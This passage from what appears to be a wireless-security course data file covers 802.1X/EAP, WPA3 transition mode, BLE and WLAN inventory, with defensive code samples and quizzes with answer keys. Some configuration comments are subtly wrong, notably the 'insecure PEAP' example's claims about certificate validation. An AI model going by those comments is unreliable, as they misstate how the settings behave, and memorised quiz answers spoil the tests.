                "WPA2/WPA3-Enterprise provides a much higher level of security than Pre-Shared Key (PSK) networks by implementing the IEEE 802.1X standard for port-based access control. This creates a framework for per-user, rather than per-network, authentication. This lesson explains the 802.1X framework and the Extensible Authentication Protocol (EAP) it uses, focusing on the components of an enterprise Wi-Fi system and the critical best practices for configuring them securely.",
              sections: [
                {
                  title: "The 802.1X Authentication Triangle",
                  content:
                    "<p>Enterprise authentication involves three distinct components, often called the '802.1X Triangle':</p><ul><li><strong>Supplicant:</strong> The client device (e.g., a laptop, phone) requesting access to the network. It is software (e.g., wpa_supplicant on Linux, built-in Wi-Fi service on Windows/OSX) that handles the EAP conversation.</li><li><strong>Authenticator:</strong> The Network Access Device (NAD), which in Wi-Fi is the Access Point. It acts as a controlled port and a gatekeeper. Its job is not to make the authentication decision but to relay EAP messages between the Supplicant and Authentication Server using the RADIUS protocol.</li><li><strong>Authentication Server:</strong> A RADIUS server (e.g., FreeRADIUS, Microsoft NPS) that makes the final access control decision. It verifies the client's credentials against a user database (like Active Directory) and tells the Authenticator whether to grant access.</li></ul><p>The key takeaway is that the AP (Authenticator) does not know the user's password; it only brokers the conversation.</p>",
                },
                {
                  title: "EAP Methods: A Security Comparison",
                  content:
                    "<p>EAP is a flexible framework, and the specific method chosen determines the actual security. The two most common methods represent a clear trade-off between security and deployment complexity.</p><ul><li><strong>PEAP (Protected EAP):</strong> A widely deployed 'tunneled' method. It first establishes a secure TLS tunnel between the Supplicant and the RADIUS server. The server proves its identity with a certificate. Then, a weaker inner authentication method (like MSCHAPv2) is used inside the tunnel to validate the user's username and password. <strong>The critical weakness:</strong> If the client is configured to <em>not validate</em> the server's certificate (a common misconfiguration for ease of deployment), it is vulnerable to a 'Rogue AP' or 'evil twin' attack where an attacker can intercept the connection and steal credentials.</li><li><strong>EAP-TLS (EAP-Transport Layer Security):</strong> The gold standard for security. It uses mutual authentication via X.509 certificates. <em>Both</em> the server and the client must present a certificate that the other party trusts. There is no password to be phished, guessed, or stolen. Compromising a user's account requires compromising their private key, which is far more difficult. While more complex to deploy, it provides the highest level of assurance.</li></ul>",
                },
                {
                  title: "Dynamic VLAN Assignment and Authorization",
                  content:
                    "<p>A powerful feature of 802.1X is dynamic policy assignment. After successful authentication, the RADIUS server can send specific attributes back to the Authenticator (AP) instructing it how to handle the client's session. The most common example is VLAN assignment. For instance, users in the 'Finance' group can be placed into a secure VLAN with strict firewall rules, while 'Guest' users are placed into an internet-only VLAN. This provides logical network segmentation based on user identity, not just physical port or SSID.</p>",
                },
              ],
              codeExamples: [
                {
                  title:
                    "Secure EAP-TLS Configuration for a Linux Client (wpa_supplicant.conf)",
                  language: "ini",
                  code: '# This is an example configuration for a client device in a lab environment.\n# It demonstrates a secure configuration for EAP-TLS with proper certificate validation.\n# Do NOT use these settings on a network you do not have permission to access.\n\nnetwork={\n    ssid="CorporateWiFi"\n    key_mgmt=WPA-EAP\n    eap=TLS # Specify EAP-TLS as the method\n    proto=RSN  # WPA2\n    pairwise=CCMP # AES encryption for unicast traffic\n    group=CCMP    # AES encryption for multicast traffic\n\n    # User/device identity (often matches the CN of the client certificate)\n    identity="johndoe@example.com"\n\n    # --- CRITICAL SECURITY SETTINGS ---\n    # Path to the Certificate Authority (CA) file that signed the RADIUS server\'s certificate.\n    # This is how the client validates that it is talking to the legitimate corporate server.\n    ca_cert="/etc/ssl/certs/company-root-ca.pem"\n\n    # Path to the client\'s certificate and private key\n    client_cert="/etc/ssl/certs/johndoe-cert.pem"\n    private_key="/etc/ssl/private/johndoe-key.pem"\n    private_key_passwd="my_very_secure_key_passphrase" # Optional, but recommended\n\n    # Enforce server certificate validation (THIS IS THE DEFAULT AND SHOULD NEVER BE DISABLED)\n    phase1="tls_disable_tlsv1_0=1 tls_disable_tlsv1_1=1" # Disable weak TLS versions\n    phase2="auth=MSCHAPV2" # Not used for EAP-TLS, but is for PEAP\n}',
                },
                {
                  title: "Insecure PEAP Configuration (Vulnerable to MitM)",
                  language: "ini",
                  code: '# WARNING: This is an example of a BAD configuration that is common but HIGHLY INSECURE.\n# It disables server certificate validation, making it trivial to perform an evil twin attack.\n\nnetwork={\n    ssid="CompanyWiFi"\n    key_mgmt=WPA-EAP\n    eap=PEAP\n    identity="johndoe"\n    password="myPassword123"\n    \n    # THIS LINE IS THE SECURITY FAILURE\n    phase1="peapver=0 peaplabel=1 tls_disable_tlsv1_0=1" \n    phase2="auth=MSCHAPV2"\n    \n    # The client will accept ANY server certificate, even one signed by an unknown CA.\n    # An attacker can easily set up a rogue AP and steal the user\'s credentials.\n    ca_cert="/etc/ssl/certs/company-root-ca.pem" # This file is effectively ignored.\n}',
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "In an 802.1X network, what is the role of the Access Point?",
                  options: [
                    "It stores all user passwords.",
                    "It acts as the Authenticator, passing messages between the client and RADIUS server.",
                    "It is the Supplicant.",
                    "It is the Authentication Server.",
                  ],
                  correct: 1,
                  explanation:
                    "The AP acts as the Authenticator or 'gatekeeper'. It doesn't make the final decision but controls access to the network based on the RADIUS server's response (Accept/Reject).",
                },
                {
                  id: 2,
                  question:
                    "Why is EAP-TLS generally considered more secure than PEAP-MSCHAPv2?",
                  options: [
                    "It is faster.",
                    "It uses mutual certificate-based authentication, eliminating passwords that can be phished or brute-forced.",
                    "It works on more devices.",
                    "It does not require a RADIUS server.",
                  ],
                  correct: 1,
                  explanation:
                    "EAP-TLS's strength comes from its reliance on cryptographic certificates for both the server and the client, removing the weak link of user passwords which are susceptible to phishing and offline cracking.",
                },
                {
                  id: 3,
                  question:
                    "What is the primary security risk of disabling server certificate validation on a supplicant, as shown in the 'insecure' example?",
                  options: [
                    "It will slow down the connection.",
                    "The user will have to type their password twice.",
                    "It makes the client vulnerable to Man-in-the-Middle (MitM) attacks where a rogue AP can steal their credentials.",
                    "It prevents the client from connecting to any network.",
                  ],
                  correct: 2,
                  explanation:
                    "Without validating the server's certificate, the client has no way of knowing if it is connecting to the legitimate corporate RADIUS server or an attacker's impersonation of it. This is the fundamental weakness that enables evil twin attacks.",
                },
              ],
            },
          },
          {
            id: "lesson-9",
            title: "WPA3 & Transition Mode Pitfalls",
            duration: "90 min",
            objectives: [
              "Understand the cryptographic improvements of WPA3's SAE handshake (Dragonfly) and its key benefits.",
              "Identify the security risks of operating in WPA2/WPA3 'transition mode'.",
              "Explain why PMF is mandatory for WPA3 connections and how it's integrated.",
              "Audit beacon frames to detect networks running in transition mode and understand the implications.",
            ],
            content: {
              overview:
                "WPA3 is the latest generation of Wi-Fi security, offering significant cryptographic improvements over WPA2, particularly for personal (PSK) networks. However, for backward compatibility with the billions of legacy WPA2 devices, many APs operate in a 'transition mode' that supports both WPA2 and WPA3 clients. This lesson delves into the strengths of WPA3's new handshake, the often-overlooked dangers of transition mode, and how to audit your network's configuration.",
              sections: [
                {
                  title:
                    "Simultaneous Authentication of Equals (SAE): The Dragonfly Handshake",
                  content:
                    "<p>The biggest improvement in WPA3-Personal is the replacement of the vulnerable WPA2-PSK 4-way handshake with the <strong>Simultaneous Authentication of Equals (SAE)</strong> protocol, based on the Dragonfly key exchange.</p><p><strong>Key Security Benefits:</strong></p><ul><li><strong>Resistance to Offline Dictionary Attacks:</strong> In WPA2, an attacker capturing the 4-way handshake could take it offline and attempt to crack the password at high speed. SAE is a 'forward-secure' exchange where the captured data is unique to that session and cannot be used for offline password testing.</li><li><strong>Forward Secrecy:</strong> Compromising the long-term password (PSK) does not allow an attacker to decrypt previously captured traffic. Each session uses unique encryption keys.</li><li><strong>Protection against Deauthentication Attacks:</strong> While not immune, the SAE handshake is more resilient to disruption than the 4-way handshake.</li></ul><p>It's important to note that a weak password is still a weak password, and a targeted active attack could still be possible, but the barrier to entry is raised immensely.</p>",
                },
                {
                  title: "The Dangers of WPA2/WPA3 Transition Mode",
                  content:
                    "<p>Transition mode is a necessary evil for migration, but it introduces a significant security risk: <strong>downgrade attacks</strong>.</p><p>When an AP advertises support for both WPA2 and WPA3 (e.g., its RSN IE contains both AKM suites 00-0F-AC:2 and 00-0F-AC:8), a sophisticated attacker can exploit this. They can use management frame injection (e.g., beacon flooding or spoofed deauths) to trick a WPA3-capable client into believing the network <em>only</em> supports WPA2. The client, wanting to connect, will then fall back to the weaker WPA2 protocol, making it vulnerable to the very attacks WPA3 was designed to prevent (e.g., offline handshake cracking).</p><p><strong>PMF is Mandatory:</strong> WPA3 requires the use of Protected Management Frames (802.11w). This is not optional. This integration helps protect the SAE handshake itself and is a core reason for WPA3's improved resilience.</p><h3>Best Practice:</h3><p>The ideal, most secure configuration is <strong>WPA3-only</strong> mode, which refuses connections from WPA2-only clients. This eliminates the downgrade attack vector entirely. Transition mode should be viewed as a temporary state, not a permanent configuration.</p>",
                },
              ],
              codeExamples: [
                {
                  title:
                    "Audit Wi-Fi Beacons for Transition Mode (Python with Scapy)",
                  language: "python",
                  code: "# This script analyzes a PCAP file to detect APs in WPA2/WPA3 transition mode.\n# It parses the RSN Information Element (IE) in Beacon frames.\nfrom scapy.all import rdpcap, Dot11, Dot11Elt, RadioTap\n\ndef audit_wpa_transition_mode(pcap_file):\n    \"\"\"\n    Parses beacons to identify networks supporting both WPA2 and WPA3.\n    Prints a warning for networks in transition mode.\n    \"\"\"\n    networks = {} # Key: BSSID, Value: {'ssid': '', 'wpa2': False, 'wpa3': False}\n    \n    try:\n        packets = rdpcap(pcap_file)\n    except FileNotFoundError:\n        print(f\"Error: File '{pcap_file}' not found.\")\n        return\n\n    for packet in packets:\n        # Check for Beacon frames (Type 0, Subtype 8)\n        if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:\n            dot11 = packet.getlayer(Dot11)\n            bssid = dot11.addr2\n            \n            # Initialize network info if we haven't seen this BSSID before\n            if bssid not in networks:\n                networks[bssid] = {'ssid': '<hidden>', 'wpa2': False, 'wpa3': False}\n            \n            # Extract the SSID and RSN IE from the beacon\n            ssid = None\n            rsn_data = None\n            elt = packet.getlayer(Dot11Elt)\n            \n            while isinstance(elt, Dot11Elt):\n                if elt.ID == 0: # SSID parameter set\n                    try:\n                        ssid = elt.info.decode('utf-8', errors='ignore')\n                        networks[bssid]['ssid'] = ssid\n                    except:\n                        pass\n                elif elt.ID == 48: # RSN Information Element\n                    rsn_data = elt.info\n                elt = elt.payload.getlayer(Dot11Elt)\n            \n            # Parse the RSN IE if it exists\n            if rsn_data:\n                # Look for AKM Suite Selectors in the RSN IE\n                # WPA2-PSK: 00-0F-AC (OUI), 02 (suite type)\n                if b'\\x00\\x0f\\xac\\x02' in rsn_data:\n                    networks[bssid]['wpa2'] = True\n                # WPA3-SAE: 00-0F-AC (OUI), 08 (suite type)  \n                if b'\\x00\\x0f\\xac\\x08' in rsn_data:\n                    networks[bssid]['wpa3'] = True\n    \n    # Print the results\n    print(f\"\\n[+] WPA Security Audit for '{pcap_file}':\")\n    print(\"BSSID              | SSID                 | WPA2 | WPA3 | Mode\")\n    print(\"-\" * 65)\n    \n    for bssid, info in networks.items():\n        mode = \"\"\n        if info['wpa2'] and info['wpa3']:\n            mode = \"TRANSITION (VULNERABLE TO DOWNGRADE)\"\n        elif info['wpa3']:\n            mode = \"WPA3-Only (Secure)\"\n        elif info['wpa2']:\n            mode = \"WPA2-Only\"\n        else:\n            mode = \"Other/Open\"\n            \n        print(f\"{bssid:18} | {info['ssid'][:20]:20} | {str(info['wpa2']):4} | {str(info['wpa3']):4} | {mode}\")\n\n# Example usage\naudit_wpa_transition_mode('wifi_beacons.pcap')",
                },
                {
                  title:
                    "Scan for Transition Mode Networks (Linux command line)",
                  language: "bash",
                  code: "# Using the 'iw' tool to scan and view AKM suites for networks.\n# This provides a live view of what security modes APs are advertising.\n\nsudo iw dev wlan0 scan | grep -A5 -B2 \"SSID:\\|AKM\" | grep -E \"SSID:|AKM|BSS\"\n\n# Sample output might look like this:\n# BSS aa:bb:cc:dd:ee:ff(on wlan0)\n#     SSID: MySecureNetwork\n#     ...\n#     AKM suites: 00-0F-AC:8 (WPA3-SAE)\n#     ...\n# \n# BSS ff:ee:dd:cc:bb:aa(on wlan0)\n#     SSID: LegacyCorpNet\n#     ...\n#     AKM suites: 00-0F-AC:2 (WPA2-PSK), 00-0F-AC:8 (WPA3-SAE)\n#     ...\n# \n# The second network, 'LegacyCorpNet', is in transition mode and should be flagged for review.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary security benefit of WPA3's SAE handshake over WPA2-PSK?",
                  options: [
                    "It increases Wi-Fi range and throughput.",
                    "It makes offline dictionary attacks against a captured handshake much more difficult.",
                    "It hides the SSID completely.",
                    "It requires a RADIUS server, adding an extra layer of security.",
                  ],
                  correct: 1,
                  explanation:
                    "SAE's design is forward-secure, meaning the data exchanged in a handshake is useless for an attacker to take offline and use to guess the password, which was the critical flaw in WPA2-PSK.",
                },
                {
                  id: 2,
                  question:
                    "Why can operating a Wi-Fi network in WPA2/WPA3 'transition mode' be a security risk?",
                  options: [
                    "It is not a risk; it is the most secure option for compatibility.",
                    "It can allow an attacker to force WPA3-capable clients to downgrade their connection to the less-secure WPA2.",
                    "It is not compatible with most modern client devices.",
                    "It automatically disables Protected Management Frames (PMF).",
                  ],
                  correct: 1,
                  explanation:
                    "Transition mode opens the door to downgrade attacks. An attacker can manipulate the network environment to make a WPA3-capable client believe WPA3 is not available, forcing it to use the weaker and vulnerable WPA2 protocol.",
                },
                {
                  id: 3,
                  question:
                    "What is the relationship between WPA3 and Protected Management Frames (PMF)?",
                  options: [
                    "They are completely separate standards.",
                    "PMF is optional in WPA3 but recommended.",
                    "WPA3 makes the use of PMF mandatory for all connections.",
                    "WPA3 replaces the need for PMF entirely.",
                  ],
                  correct: 2,
                  explanation:
                    "The WPA3 certification mandates the use of Protected Management Frames (802.11w). This is a core requirement and a key reason why WPA3 is more resilient to attacks like deauthentication floods compared to a baseline WPA2 network.",
                },
              ],
            },
          },
          {
            id: "lesson-10",
            title: "Bluetooth Low Energy (BLE) & Other Wireless Tech",
            duration: "75 min",
            objectives: [
              "Understand the basic communication model of BLE: Advertising and Connections.",
              "Recognize the different BLE pairing models (Numeric Comparison, Just Works, Out of Band) and their security implications.",
              "Identify the common weakness of 'Just Works' pairing and how it enables MitM attacks.",
              "Gain a high-level awareness of other common IoT protocols like Zigbee and Z-Wave.",
            ],
            content: {
              overview:
                "While 802.11 Wi-Fi is dominant for local area networking, many other wireless technologies are ubiquitous in modern environments, especially for IoT and personal area networks (PANs). This lesson provides a focused introduction to Bluetooth Low Energy (BLE), the most common protocol for personal devices, and touches on other technologies like Zigbee and Z-Wave that form the backbone of many smart home and industrial systems.",
              sections: [
                {
                  title: "Bluetooth Low Energy (BLE) Communication Model",
                  content:
                    "<p>BLE is designed for ultra-low-power applications like sensors, wearables, and smart home gadgets. Its communication is based on two primary phases:</p><ul><li><strong>Advertising (Broadcasting):</strong> BLE peripherals (e.g., a heart rate monitor) periodically broadcast small packets called 'advertising PDUs' to announce their presence and capabilities. These packets can contain data like the device name, services it offers (e.g., 'Heart Rate Service'), and sometimes sensor readings itself (e.g., in 'non-connectable' advertising mode). Central devices (e.g., a phone) scan for these advertisements.</li><li><strong>Connections (GATT):</strong> Once a central device finds a peripheral it wants to interact with, it initiates a connection. After connection, communication happens using the <strong>Generic Attribute Profile (GATT)</strong>. GATT defines a hierarchy: <strong>Services</strong> are collections of related functionality (e.g., a 'Battery Service'), and each service contains <strong>Characteristics</strong>, which are the actual data points (e.g., 'Battery Level'). The central device reads from or writes to these characteristics.</li></ul>",
                },
                {
                  title: "BLE Pairing, Bonding, and Security Models",
                  content:
                    "<p>Pairing is the process of creating a shared secret key (LTK - Long Term Key) between two devices for the first time. Bonding is the process of storing that key for future reconnections.</p><p><strong>LE Secure Connections Pairing:</strong> Modern BLE uses several association models, with vastly different security properties:</p><ul><li><strong>Numeric Comparison:</strong> Both devices display a 6-digit number. The user must confirm that both numbers match. This provides Man-in-the-Middle (MitM) protection.</li><li><strong>Just Works:</strong> No user interaction is required. This model provides <em>no</em> MitM protection during the initial pairing. It is intended for devices without a screen or keyboard, but its convenience makes it a major security risk for any sensitive application.</li><li><strong>Out of Band (OOB):</strong> The exchange of public keys needed for pairing is done via a second, secure channel (e.g., NFC). This is very secure but requires additional hardware.</li></ul><p>The prevalence of 'Just Works' pairing on countless IoT devices is a significant security concern, as it allows an attacker in close proximity to pair with a device without the user's knowledge during the initial setup.</p>",
                },
                {
                  title: "Beyond BLE: Zigbee and Z-Wave",
                  content:
                    "<p>Zigbee and Z-Wave are low-power, low-data-rate wireless mesh networking protocols designed for home automation, sensor networks, and industrial control systems (ICS).</p><ul><li><strong>Zigbee:</strong> Based on the IEEE 802.15.4 standard. It operates in the 2.4 GHz band (like Wi-Fi and Bluetooth) and can create large mesh networks where devices relay messages for each other. Security relies on a network key (often distributed insecurely) and link keys between devices.</li><li><strong>Z-Wave:</strong> Operates in the sub-1GHz band (e.g., 900 MHz in the US), giving it better range and less interference with Wi-Fi. It is a simpler protocol and also forms mesh networks. Each device is included into a network using a controller, and a network-wide key is used for encryption.</li></ul><p><strong>Common Vulnerabilities:</strong> Both often suffer from insecure initial key exchange ('inclusion'), weak default PINs, lack of encryption, and a general lack of transport security, making them ripe for eavesdropping and command injection attacks within physical proximity.</p>",
                },
              ],
              codeExamples: [
                {
                  title: "Scan for BLE Advertising Devices (Python with bleak)",
                  language: "python",
                  code: '# This example uses the \'bleak\' library to perform a simple BLE scan.\n# It demonstrates how to see what devices are advertising nearby.\n# Install with: pip install bleak\n\nimport asyncio\nfrom bleak import BleakScanner\n\nasync def simple_ble_scan():\n    """\n    Scans for BLE devices and prints their address, name, and RSSI signal strength.\n    """\n    print("[+] Scanning for BLE devices for 10 seconds...")\n    \n    # Use the scanner context manager\n    async with BleakScanner() as scanner:\n        await asyncio.sleep(10.0) # Scan for 10 seconds\n    \n    # Get and print the results\n    devices = await scanner.get_discovered_devices()\n    print(f"\\nFound {len(devices)} devices:")\n    print("-" * 50)\n    for d in devices:\n        print(f"Address: {d.address}")\n        print(f"  Name: {d.name}")\n        print(f"  RSSI: {d.rssi} dBm")\n        print(f"  Details: {d.details}")\n        print("-" * 25)\n\n# Run the scan\nasyncio.run(simple_ble_scan())',
                },
                {
                  title: "Basic BLE GATT Communication Example (Conceptual)",
                  language: "python",
                  code: '# Conceptual code showing the steps to connect and read a characteristic.\n# This would not run without a specific device UUID.\n# This is for educational purposes to understand the workflow.\n\nimport asyncio\nfrom bleak import BleakClient\n\n# You must discover these UUIDs first by scanning/services/characteristics\nDEVICE_ADDRESS = "AA:BB:CC:DD:EE:FF"\nSERVICE_UUID = "0000180f-0000-1000-8000-00805f9b34fb"  # Battery Service\nCHARACTERISTIC_UUID = "00002a19-0000-1000-8000-00805f9b34fb"  # Battery Level\n\nasync def read_battery_level():\n    try:\n        async with BleakClient(DEVICE_ADDRESS) as client:\n            print(f"[+] Connected to {DEVICE_ADDRESS}")\n            \n            # Check if the service is available\n            svcs = await client.get_services()\n            battery_service = svcs.get_service(SERVICE_UUID)\n            if not battery_service:\n                print("Battery service not found!")\n                return\n            \n            # Read the value of the battery level characteristic\n            battery_level = await client.read_gatt_char(CHARACTERISTIC_UUID)\n            # The value is often a single byte representing a percentage\n            print(f"Battery Level: {int.from_bytes(battery_level, byteorder=\'little\')}%")\n            \n    except Exception as e:\n        print(f"[-] Failed to read: {e}")\n\n# asyncio.run(read_battery_level()) # Uncomment to run with real UUIDs',
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary security weakness of 'Just Works' pairing in BLE?",
                  options: [
                    "It uses too much battery power.",
                    "It is susceptible to man-in-the-middle (MITM) attacks during the initial pairing process.",
                    "It only works over very short distances.",
                    "It requires a long and complex password that users often forget.",
                  ],
                  correct: 1,
                  explanation:
                    "'Just Works' pairing provides no mechanism for the user to verify the identity of the device they are pairing with. An attacker in range can intercept the pairing process and establish their own keys with both devices, becoming a permanent man-in-the-middle.",
                },
                {
                  id: 2,
                  question:
                    "How do BLE devices initially announce their presence to other devices?",
                  options: [
                    "By initiating a GATT connection.",
                    "By broadcasting advertising packets.",
                    "By sending deauthentication frames.",
                    "By connecting to a Zigbee hub.",
                  ],
                  correct: 1,
                  explanation:
                    "BLE peripherals use advertising packets (broadcasts) to let central devices (like a phone) know they are available to connect. The central device must be scanning to hear these advertisements.",
                },
                {
                  id: 3,
                  question:
                    "What is a key architectural difference between protocols like Zigbee/Z-Wave and standard Wi-Fi?",
                  options: [
                    "Zigbee uses IP addressing exclusively.",
                    "They are designed as low-power, low-data-rate mesh networks for IoT, not for general internet access.",
                    "They have a much longer range and are immune to eavesdropping.",
                    "They operate only on the 5 GHz band to avoid interference.",
                  ],
                  correct: 1,
                  explanation:
                    "Zigbee and Z-Wave are optimized for a different use case: connecting dozens of simple sensors and actuators in a mesh network with minimal power consumption. They trade off high data throughput and native IP compatibility for these benefits, which introduces a different set of security considerations compared to Wi-Fi.",
                },
              ],
            },
          },
          {
            id: "lesson-11",
            title: "WLAN Enumeration & Asset Inventory (Defensive)",
            duration: "90 min",
            objectives: [
              "Understand the critical role of a wireless asset inventory as the foundation of wireless security.",
              "Use passive and active analysis techniques to build a comprehensive list of all wireless assets.",
              "Correlate observed BSSIDs, SSIDs, and security settings with an authorized list to identify policy violations and rogue devices.",
              "Automate the process of generating a detailed, actionable inventory report from packet captures and live scans.",
            ],
            content: {
              overview:
                "A fundamental principle of security is that you cannot defend what you do not know you have. For wireless networks, this is especially critical due to the ephemeral and broadcast nature of the medium. This lesson focuses on the defensive practice of building, maintaining, and leveraging a comprehensive inventory of all wireless access points and clients in your environment. This inventory is the essential baseline for detecting rogue APs, misconfigured devices, and ensuring all networks comply with organizational security policy.",
              sections: [
                {
                  title:
                    "Building a Comprehensive Inventory: Passive vs. Active",
                  content:
                    "<p>There are two primary methods for building a wireless inventory:</p><ul><li><strong>Passive Analysis:</strong> This involves silently listening to the airwaves and collecting broadcast frames, primarily Beacon and Probe Response frames. This is stealthy, low-risk, and provides a wealth of information like SSID, BSSID (MAC address), supported data rates, security capabilities (RSN IE), channel, and signal strength. It is the preferred method for initial baselining and ongoing monitoring as it doesn't interact with the network.</li><li><strong>Active Scanning:</strong> This involves sending Probe Request frames to elicit responses from APs. It can discover networks that are configured as 'hidden' (non-broadcast SSID) because they will still respond to a direct probe. However, it is 'noisy' and can be detected by network monitoring systems.</li></ul><p>The goal is to create a living database that maps every observed SSID to its BSSID(s), channel, security configuration, and first/last seen timestamps. This provides a ground-truth baseline of normal activity against which all future observations can be compared.</p>",
                },
                {
                  title: "Identifying Policy Violations and Threat Indicators",
                  content:
                    "<p>Once a baseline inventory is established, it becomes a powerful tool for enforcement and threat hunting. Any network that violates policy can be flagged for immediate investigation. Common red flags include:</p><ul><li><strong>Rogue AP / Evil Twin:</strong> An AP broadcasting the corporate SSID (e.g., 'Company_Guest') that is not on the authorized BSSID list. This is a high-severity finding.</li><li><strong>Unauthorized AP:</strong> A new, unknown AP appearing in a secure area (e.g., a new 'linksys' SSID in the financial department). This could be a poorly configured personal device creating a backdoor.</li><li><strong>Misconfiguration:</strong> An authorized AP suddenly changing its configuration to use weaker security (e.g., WPA2 to WEP, or enabling WPS). This could indicate a compromised device or an accidental change.</li><li><strong>Spoofed BSSID:</strong> An AP with a BSSID that mimics the OUI (Organizational Unique Identifier) of your company's hardware vendor but is not in the inventory. Attackers often spoof OUIs to blend in.</li></ul>",
                },
              ],
              codeExamples: [
                {
                  title: "Advanced WLAN Inventory Generator with Vendor Lookup",
                  language: "python",
                  code: "#!/usr/bin/env python3\n\"\"\"\nEnhanced WLAN Inventory Generator.\nParses a PCAP, extracts AP details from beacons, and enriches data with vendor OUI lookup.\nExports to a detailed CSV for analysis and baselining.\n\"\"\"\nimport csv\nfrom scapy.all import rdpcap, Dot11, Dot11Elt, hexdump\nfrom scapy.all import getmacbyip  # Not for IP, but we'll use the OUI function\nimport requests\nimport re\n\n# A small local OUI dictionary for demo. In practice, use a full list from IEEE.\nOUI_DB = {\n    \"aa:bb:cc\": \"VendorA, Inc.\",\n    \"de:ad:be\": \"VendorB, Corp\",\n    \"00:50:f2\": \"Intel Corporate\",\n    \"dc:ce:c1\": \"Cisco Systems\"\n}\n\ndef get_vendor_from_oui(bssid):\n    \"\"\"Tries to resolve the OUI (first 3 bytes of MAC) to a vendor name.\"\"\"\n    oui = \":\".join(bssid.lower().split(\":\")[:3])\n    return OUI_DB.get(oui, \"Unknown\")\n\ndef generate_wlan_inventory(pcap_file, output_csv):\n    \"\"\"Creates a detailed CSV inventory of all APs found in a PCAP.\"\"\"\n    inventory = {}\n    try:\n        print(f\"[+] Reading PCAP file: {pcap_file}\")\n        pkts = rdpcap(pcap_file)\n    except FileNotFoundError:\n        print(f\"[-] Error: File '{pcap_file}' not found.\")\n        return\n    except Exception as e:\n        print(f\"[-] Error reading PCAP: {e}\")\n        return\n\n    print(\"[+] Analyzing beacon frames...\")\n    for pkt in pkts:\n        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8: # Beacon\n            bssid = pkt.addr2\n            if bssid in inventory:\n                continue  # Already processed this AP\n\n            ssid, channel, privacy, cipher, akm, wps, rssi = 'hidden', None, 'Open', '', '', False, pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else 'N/A'\n            elt = pkt.getlayer(Dot11Elt)\n            \n            while elt:\n                if elt.ID == 0: # SSID\n                    try:\n                        ssid = elt.info.decode('utf-8', errors='ignore').strip()\n                        if ssid == '':\n                            ssid = '<hidden>'\n                    except:\n                        ssid = '<decode_error>'\n                elif elt.ID == 3: # DS Parameter Set (Channel)\n                    channel = int(elt.info[0])\n                elif elt.ID == 48: # RSN Information Element\n                    privacy = 'WPA2/WPA3'\n                    # Simple parsing of RSN IE for AKM and Cipher suites\n                    rsn_info = elt.info\n                    # Look for AKM Suite Selectors (offset can vary, this is simplified)\n                    if b'\\x00\\x0f\\xac\\x02' in rsn_info:\n                        akm += 'PSK/'\n                    if b'\\x00\\x0f\\xac\\x08' in rsn_info:\n                        akm += 'SAE/'\n                    if b'\\x00\\x0f\\xac\\x04' in rsn_info:\n                        akm += 'FT/'\n                    akm = akm.rstrip('/')\n                    cipher = 'CCMP' # Often assumed for WPA2+\n                elif elt.ID == 221: # Vendor Specific\n                    # Check for WPS tag (00:50:F2, type 0x04)\n                    if elt.info.startswith(b'\\x00P\\xf2\\x04'):\n                        wps = True\n                elt = elt.payload.getlayer(Dot11Elt)\n            \n            vendor = get_vendor_from_oui(bssid)\n            inventory[bssid] = [ssid, bssid, channel, privacy, akm, cipher, str(wps), rssi, vendor]\n\n    if not inventory:\n        print(\"[-] No beacon frames found in the capture.\")\n        return\n\n    # Write to CSV\n    header = ['SSID', 'BSSID', 'Channel', 'Privacy', 'AKM', 'Cipher', 'WPS_Enabled', 'RSSI', 'Vendor']\n    try:\n        with open(output_csv, 'w', newline='', encoding='utf-8') as f:\n            writer = csv.writer(f)\n            writer.writerow(header)\n            # Sort by SSID for readability\n            writer.writerows(sorted(inventory.values(), key=lambda x: x[0]))\n        print(f\"[+] Success! Wrote detailed inventory of {len(inventory)} APs to '{output_csv}'\")\n    except IOError as e:\n        print(f\"[-] Error writing to CSV: {e}\")\n\n# Example usage\nif __name__ == \"__main__\":\n    generate_wlan_inventory('network_capture.pcap', 'wlan_inventory_detailed.csv')",
                },
                {
                  title: "Live AP Scanner with Airodump-ng (CLI Tool)",
                  language: "bash",
                  code: "# Using airodump-ng to perform a live wireless inventory.\n# This is an active+passive tool that is part of the Aircrack-ng suite.\n# Put your wireless interface in monitor mode first.\n# This command will show all APs and clients in real-time.\n\n# Set interface to monitor mode\nsudo airmon-ng start wlan0\n\n# Start airodump-ng on the monitor interface\n# -w specifies the output file prefix for logs (csv, cap files)\n# --output-format csv formats the output for easy parsing\nsudo airodump-ng -w baseline_scan --output-format csv wlan0mon\n\n# After scanning (Ctrl+C to stop), you will have a file like 'baseline_scan-01.csv'\n# This CSV can be imported into a spreadsheet or parsed with scripts for analysis.\n# The CSV contains columns for BSSID, channel, privacy, cipher, etc.\n\n# Remember to stop monitor mode after the scan\nsudo airmon-ng stop wlan0mon",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary purpose of creating a wireless asset inventory?",
                  options: [
                    "To measure Wi-Fi signal strength in all offices.",
                    "To establish a baseline of known, authorized devices in order to detect anomalies and unauthorized devices.",
                    "To find the fastest Wi-Fi channel for the CEO's office.",
                    "To block all personal devices from connecting.",
                  ],
                  correct: 1,
                  explanation:
                    "An inventory provides the ground truth of what *should* be on your network. This is the single most important reference for identifying any deviation, which is the first step in detecting rogue devices, evil twins, and misconfigurations.",
                },
                {
                  id: 2,
                  question:
                    "During a periodic wireless scan, you find an AP broadcasting your 'Corporate' SSID, but its BSSID is not on your list of company-owned APs and its vendor is listed as 'Unknown'. This is a strong indicator of a potential:",
                  options: [
                    "A new model of AP from your approved vendor.",
                    "A channel overlap issue causing interference.",
                    "An Evil Twin attack or an unauthorized, rogue AP.",
                    "A normal network expansion you weren't informed about.",
                  ],
                  correct: 2,
                  explanation:
                    "This combination of factors (correct SSID, wrong BSSID, unknown vendor) is a massive red flag. It strongly indicates someone is spoofing your network, either for malicious purposes (evil twin) or as an unauthorized personal device creating a security hole.",
                },
                {
                  id: 3,
                  question:
                    "What is a key advantage of passive inventory scanning over active scanning?",
                  options: [
                    "It can discover hidden SSIDs.",
                    "It is stealthier and cannot be detected by the networks it is enumerating.",
                    "It provides more detailed client information.",
